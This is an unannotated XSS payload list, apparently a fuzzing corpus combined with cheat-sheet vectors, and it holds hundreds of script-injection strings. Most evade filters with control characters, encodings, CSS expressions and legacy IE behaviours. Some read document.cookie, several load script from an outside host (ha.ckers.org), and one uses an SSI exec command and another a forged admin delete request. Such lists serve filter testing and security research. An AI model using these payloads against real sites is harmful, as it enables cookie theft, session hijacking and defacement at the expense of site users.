<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
"><img src=x onerror=javascript:alert(1)>
"><img src=x onerror=javascript:alert('1')>
"><img src=x onerror=javascript:alert("1")>
"><img src=x onerror=javascript:alert(`1`)>
"><img src=x onerror=javascript:alert(('1'))>
"><img src=x onerror=javascript:alert(("1"))>
"><img src=x onerror=javascript:alert((`1`))>
"><img src=x onerror=javascript:alert(A)>
"><img src=x onerror=javascript:alert((A))>
"><img src=x onerror=javascript:alert(('A'))>
"><img src=x onerror=javascript:alert('A')>
"><img src=x onerror=javascript:alert(("A"))>
"><img src=x onerror=javascript:alert("A")>
"><img src=x onerror=javascript:alert((`A`))>
"><img src=x onerror=javascript:alert(`A`)>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
